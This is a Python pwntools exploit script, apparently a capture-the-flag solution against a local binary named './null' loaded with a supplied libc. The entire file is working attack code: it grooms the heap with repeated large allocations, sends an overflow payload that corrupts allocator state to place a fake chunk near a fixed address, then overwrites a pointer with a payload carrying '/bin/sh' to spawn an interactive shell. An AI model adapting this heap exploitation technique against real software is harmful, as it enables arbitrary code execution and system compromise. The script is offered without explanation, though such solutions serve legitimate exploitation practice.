#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
context.log_level = "critical"
context.binary = "./null"

def use(size, pad, ipt, cont = ""):
    io.sendlineafter("Action: ", "1")
    io.sendlineafter("Size: ", str(size))
    io.sendlineafter("blocks:", str(pad))
    io.sendlineafter("(0/1): ", str(ipt))
    sleep(0.01)
    if ipt:
        io.sendafter("Input: ", cont)
        sleep(0.01)

#  io = process("./null")
io = process("./null", env = {"LD_PRELOAD": "./libc.so.6"})

io.sendlineafter("password: \n", "i'm ready for challenge")

for i in xrange(12):
    use(0x4000, 1000, 0)
#  pause()
use(0x4000, 262, 1, '0' * 0x3ff0)
#  pause()
payload = flat('1' * 0x50, p32(0), p32(3), 0, 0, 0, 0, 0, 0x60201d)
io.send(payload)
sleep(0.01)

payload = fit({
    0x0: "/bin/sh\0",
    0xb: flat(0x400978)
    }, filler = '\0', length = 0x60)
use(0x60, 0, 1, payload)

io.interactive()
io.close()
